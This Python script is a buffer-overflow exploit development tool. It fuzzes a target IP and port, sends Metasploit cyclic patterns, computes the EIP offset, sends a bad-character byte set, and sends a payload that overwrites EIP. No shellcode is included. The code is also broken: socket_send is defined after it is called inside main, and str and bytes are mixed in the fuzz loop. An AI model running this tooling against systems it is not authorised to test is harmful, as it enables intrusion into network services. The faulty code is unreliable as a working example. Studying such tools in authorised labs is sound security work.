#!/usr/bin/env python3

import socket, time, sys, argparse, subprocess

def main():

  # Parse the command line arguments
  parser = argparse.ArgumentParser(description='Python based fuzzer with lots of options')
  parser.add_argument('-a', '--action', choices=["fuzz", "pattern", "offset", "chars", "verify"], help="What action you want to perform on the application, either a fuzz, a pattern create, offset determination, or bad characters")
  parser.add_argument('-i', '--ip', type=str, help="IP address of system to fuzz", required=True)
  parser.add_argument('-p', '--port', type=int, help="Port number of service/application to fuzz", required=True)
  parser.add_argument('-s', '--start', default="", type=str, help="(DEFUALT = None) Start of the string you want to send to application")
  parser.add_argument('-e', '--end', default="", type=str, help="(DEFUALT = None) End of the string you want to send to application")
  parser.add_argument('-l', '--length', type=int, help="Length of the pattern you want to send")
  parser.add_argument('-q', '--query', type=str, help="Value found in EIP when debugger crashed from the pattern create")
  parser.add_argument('-o', '--offset', type=int, help="The offset of the EIP")
  parser.add_argument('-t', '--timeout', default=2, type=int, help='(DEFAULT = 2s) How long the timeout should be for the connection')
  args = parser.parse_args()

  # Get relevant args
  action = args.action
  ip = args.ip
  port = args.port
  start = args.start
  end = args.end
  length = args.length
  query = args.query
  offset = args.offset
  timeout = args.timeout

  # Convert some of the args
  start = str.encode(start)
  end = str.encode(end)

  # Create string to send to app
  if action == 'fuzz':
    inc = 1
    string = start + b"A" * 100 + end

    while True:
      num_bytes = 100 * inc
      string = start + "A" * num_bytes + end
      try:
        socket_send(string, f"Fuzzing with {(len(string) - len(start))} bytes")
      except:
        print(f"Fuzzing crashed at {(len(string) - len(start))} bytes")
        sys.exit(0)
      inc += 1
      time.sleep(1)

  elif action == 'pattern':
    if (length is None): raise Exception("Must supply a length if using pattern")
    pattern = create_pattern(length)
    string = start + pattern + end
    socket_send(string, f"Sending pattern of size {length}", "Patern sent")
  
  elif action == 'chars':
    try:
      socket_send(get_all_bytes(), "Sending all possible bytes", "All possible bytes sent")
    except:
      print("Check your debugger for a crash")

  elif action == 'offset':
    if (query is None): raise Exception("Must supply a query if using offset")
    print(f"Finding offset of the query {query}")
    query = query.strip()
    result = determine_offset(query)
    print(result.decode("utf-8"))

  elif action == 'verify':
    if (offset is None): raise Exception("Must supply an offset if using verify")
    print(f"Verifying the offset and seding additional data")

    # Build the payload
    payload = [
      start,
      b"A" * (offset + 2), # The overflow
      end,
      b"B" * 4, # The new EIP
      b"C" * 100, # The Stack 
    ]
    payload = b"".join(payload)
    try:
      socket_send(payload, "Sending verification payload", "Payload sent")
    except:
      print("Check your debugger for a crash")

  def socket_send(payload, print_before="", print_after=""):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(print_before)
      s.send(payload)
      s.recv(1024)
      print(print_after)
    


def system_call(command, timeout=0):
  if (timeout == 0):
    return subprocess.check_output(command, stderr=subprocess.STDOUT)
  return subprocess.check_output(command, stderr=subprocess.STDOUT, timeout=timeout)

def determine_offset(pattern_in_eip, path_to_pattern_offset="/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"):
  return system_call([path_to_pattern_offset, "-q", f"{pattern_in_eip}"]) 

def create_pattern(length, path_to_pattern_create="/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"):
  return system_call([path_to_pattern_create, "-l", f"{length}"]) 

def get_all_bytes():
  byte_string = b""
  for i in range(256):
    byte_string = byte_string + i.to_bytes(1, "big")
  return byte_string

if __name__ == "__main__":
  main()
